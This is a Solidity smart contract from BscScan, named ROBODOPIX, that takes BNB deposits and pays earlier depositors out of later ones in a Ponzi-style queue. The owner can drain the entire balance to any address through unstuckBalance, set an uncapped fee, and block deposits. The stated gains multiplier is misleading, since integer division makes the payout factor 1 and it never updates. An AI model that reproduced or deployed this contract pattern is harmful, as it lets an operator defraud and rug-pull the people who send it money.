/**
 *Submitted for verification at BscScan.com on 2022-03-21
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;



contract ROBODOPIX {

    struct user{
        uint256 amount;
        address userAddr;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    address owner = 0x6F774dD2764Fd70746b328212699B56810D34C81;

    mapping(uint256 => user) public IDToUser;
    uint256 public currentID;
    uint256 public totalID;

    uint256 maxBNBAccepted = 10000000000000000;
    uint256 devFeePercentage = 5;

    uint256 gainsMultiplier = 5;
    uint256 gainsMultiplier2 = gainsMultiplier / 4;
    function setDevFeePercentage(uint256 percent) public onlyOwner{
        devFeePercentage = percent;

    }

    function setGainsMultiplier(uint256 gm) public onlyOwner{
        require (gm > 0);
        gainsMultiplier = gm;
    }

    function setMaxBNBAccepted(uint256 maxBNBAccept) public onlyOwner{
        maxBNBAccepted = maxBNBAccept;
    }

    bool allowTransfer = true;

    function setAllowTransfer(bool b) public onlyOwner{
        allowTransfer = b;
    }

    function unstuckBalance(address receiver) public onlyOwner{
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }

    receive() payable external {
        require(msg.value <= maxBNBAccepted && allowTransfer == true);
        IDToUser[totalID].userAddr = msg.sender;
        IDToUser[totalID].amount = msg.value;
        totalID++;
        uint256 devBalance = (msg.value * devFeePercentage) > 100 ? (msg.value * devFeePercentage) / 100 : 0;
        payable(owner).transfer(devBalance);

        uint256 availableBalance = address(this).balance;
        uint256 amountToSend = IDToUser[currentID].amount;
        if(availableBalance >= amountToSend * gainsMultiplier2){
            payable(IDToUser[currentID].userAddr).transfer(amountToSend * gainsMultiplier2);
            currentID++;
        }     
    }
        

}